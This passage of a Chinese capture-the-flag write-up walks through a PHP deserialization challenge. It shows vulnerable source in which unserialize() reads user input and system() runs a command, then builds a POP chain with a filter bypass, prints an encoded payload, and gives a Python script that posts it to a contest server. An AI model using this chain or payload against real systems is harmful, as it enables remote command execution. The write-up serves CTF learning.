class="hljs-string">&#x27;东西都没给对!&#x27;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;reset&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Login</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;login();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;logout();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$flag</span> = file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>        <span class="hljs-variable">$pAssM0rd</span> = hash(<span class="hljs-string">&quot;sha256&quot;</span>, <span class="hljs-variable">$flag</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pAssM0rd&#x27;</span>] === <span class="hljs-variable">$pAssM0rd</span>)<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;isccIsCciScc1scc&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;finish&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_TellMeTruth</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;似乎这个 &quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot; 是真相&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;似乎这个 &quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot; 是真相&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Command</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;看看你干的好事: <span class="hljs-subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_unser_finished</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;cmd&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_unser_finished</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;<br>            @system(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randstr</span>(<span class="hljs-params"><span class="hljs-variable">$len</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;<br>    <span class="hljs-variable">$randstring</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randstring</span> .= <span class="hljs-variable">$characters</span>[rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$characters</span>))];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randstring</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$s</span>, <span class="hljs-string">&quot;*&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finalize</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>    @unlink(<span class="hljs-variable">$iscc_file</span>);<br>    <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;finish&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whatareyounongshane&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$whatareyounongshane</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whatareyounongshane&#x27;</span>];<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$whatareyounongshane</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;src&quot;</span>:<br>            highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;cmd&quot;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想越级干好事？还是有门的……&quot;</span>;<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;reset&quot;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;upload&quot;</span>:<br>            <span class="hljs-variable">$resp</span> = &lt;&lt;&lt;EOF<br>&lt;form action=<span class="hljs-string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>  &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;iscc_file&quot;</span>&gt;<br>  &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload Image&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>EOF;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$resp</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;tellmetruth&quot;</span>:<br>            <span class="hljs-keyword">echo</span> base64_decode(<span class="hljs-string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;空空如也就是我！&quot;</span>;<br>    &#125;<br>    finalize();<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>])) &#123;<br><br>    <span class="hljs-variable">$wtf</span> = waf(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;?&#x27;</span>&#125;) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;试试就“逝世”!&quot;</span>));<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$goodshit</span> = @unserialize(<span class="hljs-variable">$wtf</span>)) &#123;<br>        <span class="hljs-variable">$is_unser_finished</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$status</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;upload_ok&#x27;</span>, <span class="hljs-string">&#x27;upload_fail&#x27;</span>, <span class="hljs-string">&#x27;reset&#x27;</span>), <span class="hljs-literal">true</span>))<br>        finalize();<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ISCC_Command类里面的__destruct方法可以执行cmd命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_unser_finished</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;cmd&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_unser_finished</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;<br>            @system(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在ISCC_ResetCMD类里面对cmd进行重新赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;reset&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里的__destruct方法必须得满足这个才能重置命令,即需要名为isccIsCciScc1scc的SESSION</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br></code></pre></td></tr></table></figure><p>通过变量覆盖来控制$_SESSION的值</p><p>ISCC__Upload类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = (count(<span class="hljs-variable">$_FILES</span>) &gt; <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$iscc_file</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_fail&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>                <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br></code></pre></td></tr></table></figure><p>其中<code>$GLOBALS[&#39;key&#39;] = value;</code>为全局变量的覆盖，当<code>$is_upload为true</code>的时候，就会触发这个循环，可以实现<code>$_SESSION</code>的变量覆盖。</p><p>而在upload类里面的__wakeup方法里面<code>$is_upload = (count($_FILES) &gt; 0);</code>会把他设置成true，其他的类都设置成了false。</p><p>这里了解一下<code>$_FILES</code>，<code>$_FILES</code>通过 HTTP POST 方式上传到当前脚本的项目的数组。<br>数组内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]  　　　  <span class="hljs-comment">#客户端机器文件的原名称。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]　　　　  <span class="hljs-comment">#文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“image/gif”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]　　　　  <span class="hljs-comment">#已上传文件的大小，单位为字节。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]    <span class="hljs-comment">#文件被上传后在服务端储存的临时文件名。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]       <span class="hljs-comment">#和该文件上传相关的错误代码。此项目是在 PHP 4.2.0 版本中增加的。</span><br></code></pre></td></tr></table></figure><p>所以我们就要让upload执行__destruct的时候，is_upload是true<br>这就要求，最早执行__destruct，最晚执行__wakeup，所以就可以按一定顺序来构造POP链</p><p>由于有一个waf函数，不能出现<code>*</code>号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$s</span>, <span class="hljs-string">&quot;*&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是ISCC_ResetCMD类的<code>$new_cmd</code>的属性是protected的，序列化后会带有<code>*</code>，这就需要ISCC_Upload类的__wakeup在这些类的最后进行，但是__destruct要在第一个开始。需要按一定顺序来构造POP链::</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Command</span> </span>&#123;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_Upload(),<br>    <span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_ResetCMD(),<br>    <span class="hljs-string">&#x27;c&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_Command(),<br>);<br><span class="hljs-variable">$b</span>=serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527200514790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>利用16进制绕过,将s替换成S，在序列化内容中使用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制进行表示。使用url编码一下，然后替换s即可。</p><p>重新构造POP链:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>class ISCC_Command &#123;<br><br>&#125;<br>class ISCC_ResetCMD &#123;<br><br>    protected $new_cmd = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><br>&#125;<br>class ISCC_Upload &#123;<br>&#125;<br>$a=array(<br>    &#x27;a&#x27;=&gt;new ISCC_Upload(),<br>    &#x27;b&#x27;=&gt;new ISCC_ResetCMD(),<br>    &#x27;c&#x27;=&gt;new ISCC_Command(),<br>);<br>$b=urlencode(serialize($a));<br>$b=str_replace(<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,$b);<br>$b=str_replace(<span class="hljs-string">&quot;%2A&quot;</span>,<span class="hljs-string">&#x27;\2a&#x27;</span>,$b);<br>echo $b;<br></code></pre></td></tr></table></figure><p>运行得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>BS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_Upload%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>DS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_ReSetCMD%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>BS%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>\<span class="hljs-number">2</span>a%<span class="hljs-number">00</span>new_cmd%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BS%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>DS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>c%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_Command%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>通过python脚本上传，注意图片不能太大</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://39.96.91.106:7050/&quot;</span><br><br>files=&#123;<br>    <span class="hljs-string">&#x27;iscc_file&#x27;</span>:(<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;atkx.jpg&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)),<br>    <span class="hljs-string">&quot;_SESSION&quot;</span>:(<span class="hljs-string">&quot;isccIsCciScc1scc&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>)<br>&#125;<br>headers=&#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&quot;XDEBUG_SESSION=PHPSTORM&quot;</span><br>&#125;<br>r=requests.post(url=url+<span class="hljs-string">&quot;??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D&quot;</span>,files=files,headers=headers)<br><br>print(r.text)<br></code></pre></td></tr></table></figure><p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210505151511508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 